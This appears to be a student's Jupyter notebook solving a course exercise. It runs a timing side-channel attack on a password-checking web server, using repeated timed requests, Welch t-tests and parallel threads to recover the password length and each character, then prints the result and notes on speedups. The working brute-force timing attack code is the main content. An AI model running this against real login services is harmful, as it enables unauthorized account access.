### Imports

In [119]:
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import timeit
import numpy
import requests
import math

### Environemnt

In [120]:
SERVER_IP="aoi-assignment1.oy.ne.ro:8080"
USERNAME="id"
DIFFICULTY="5"
FORMAT="http://{}/?user={}&password={}&difficulty={}"
RETRIES=16
PASSWORD_CHARS="abcdefghijklmnopqrstuvwxyz"
MAX_PASSWORD_LENGTH=32
SESSION=requests.Session()
SESSION.verify = False
SESSION.headers.update({"Connection": "keep-alive"})

In [121]:
class CorrectException(Exception):
    """
    If we by mistake hit the correct password we want to know it.
    This is because if we hit the correct password the server might early return for us.
    Also if we hit the correct password we can stop trying.
    So we abuse the exception mechanisem to fast return to main.
    """
    pass

### Request sender

In [122]:
def try_password(password: str) -> None:
    """
    :param password: A password to try.
    Return: None, we only care about the time.
    Throws: CorrectException if correct, we want to stop as soon as we hit the correct password
    """

    url = FORMAT.format(SERVER_IP, USERNAME, password, DIFFICULTY)
    result = SESSION.get(url).text
    if "1" == result:
        raise CorrectException(password)

### Timers and tests

In [123]:
def time_candidate(candidate: str, repeats: int) -> list[float]:
    """
    Return a list of timing samples instead of one averaged value.
    """
    samples = []
    for _ in range(repeats):
        start = timeit.default_timer()
        try_password(candidate)
        samples.append(timeit.default_timer() - start)
    return samples

def welch_ttest(sample_a, sample_b):
    """
    Return t-statistic comparing mean(sample_a) > mean(sample_b)
    (one-sided: does A likely have larger mean?)
    """

    mean_a = sum(sample_a) / len(sample_a)
    mean_b = sum(sample_b) / len(sample_b)

    var_a = numpy.var(sample_a, ddof=1)
    var_b = numpy.var(sample_b, ddof=1)

    t_score = (mean_a - mean_b) / math.sqrt(var_a/len(sample_a) + var_b/len(sample_b))
    return t_score

### Length functions

In [124]:
def find_length() -> int:
    """
    Uses a timing attack to find the length of the password using t-tests.
    Returns the most likely length.
    """

    single_char = PASSWORD_CHARS[0]
    samples_by_len: list[list[float]] = []

    password = ""
    for _ in range(MAX_PASSWORD_LENGTH):
        password += single_char
        samples = time_candidate(password, RETRIES)
        samples_by_len.append(samples)

    t_scores = [0.0] * MAX_PASSWORD_LENGTH

    for length_1 in range(MAX_PASSWORD_LENGTH):
        for length_2 in range(MAX_PASSWORD_LENGTH):
            if length_1 == length_2:
                continue
            t_scores[length_1] += welch_ttest(samples_by_len[length_1], samples_by_len[length_2])

    return t_scores.index(max(t_scores)) + 1

### Chars functions

In [125]:
def time_char(char: str, password: str) -> tuple[str, list[float]]:
    samples = time_candidate(password, RETRIES)
    return char, samples

def find_next_char(start_password, padding) -> str:
    """
    Find next char using Welch t-tests instead of max average.
    """

    samples_by_char: dict[str, list[float]] = {}

    with ThreadPoolExecutor(max_workers=len(PASSWORD_CHARS)) as executor:
        futures = {
            executor.submit(
                time_char,
                char,
                start_password + char + padding
            ): char
            for char in PASSWORD_CHARS
        }

        for future in as_completed(futures):
            char, samples = future.result()
            samples_by_char[char] = samples

    t_scores = {char: 0.0 for char in samples_by_char}

    for char_1 in PASSWORD_CHARS:
        for char_2 in PASSWORD_CHARS:
            if char_1 == char_2:
                continue
            t_scores[char_1] += welch_ttest(samples_by_char[char_1], samples_by_char[char_2])

    return max(t_scores, key=t_scores.get)

### Crack

In [126]:

def _crack() -> None:
    """
    Cracks the password.

    Throws: The correct password
    """
    length = find_length()
    password = ""
    padding = PASSWORD_CHARS[0] * length
    for _ in range(length):
        password += find_next_char(password,padding[0:length-len(password)-1])

def crack() -> str | None:
    """
    Return: password on success or None otherwise.
    """

    try:
        _crack()
        return None
    except CorrectException as password:
        return password.args[0]

### main

In [127]:
def main() -> None:
    while True:
        password = crack()
        if password is not None:
            print(password)
            return


In [128]:
main()

hxqjuvoodmxqirrj


### Solution times:
Level 5: 16 retries (sending the same password): 3 minutes

Level 10: 100 retries: 11 minutes

### Notes
The solution uses two things that optimizes the code
1. The usage of t-test as seen in lecture 3
2. Parallel code.

The usage of t-test allows us to differntiate between the curves of the random sleep in each char,
and the sleep of the extra char.
This allows us to seperate better then just taking the average and allows us to send fewer requests.

The usage of parallel code allows us to only need to sleep once for each char in the password (For a total of 16 times) instead of sleeping for each char in each try (16 * 26)

There are a few more ways we can optimze this code,
1. Parallel code for each try
2. Parallel code for finding the length
3. backtracking the tries

We can use parallel coding for each try (instead of 26 threads, 26*RETRIES threads) but it comes with the risk of overloading the server (and our computer) as each thread comes with more overhead and it might effect the noise in our program.

We are currently finding the length in a non-parallel way because we find the solution fast enough to not need it (3 minutes for level 5), We can easly save about 40 seconds if we find the length in parallel. (It will be more importent in the second task, where it will be a lot more then just 40 seconds)

When the probabilities are too similar in the t-test we can choosen an incorrect value,
We are currently retrying from the start if our guess for the 16th character is wrong,
We can save our guesses in a data structure and check if our guess is correct by seeing if the time it takes for each char really does take longer each time. this way we can advance with fewer tries, and adapt and use more tries if needed.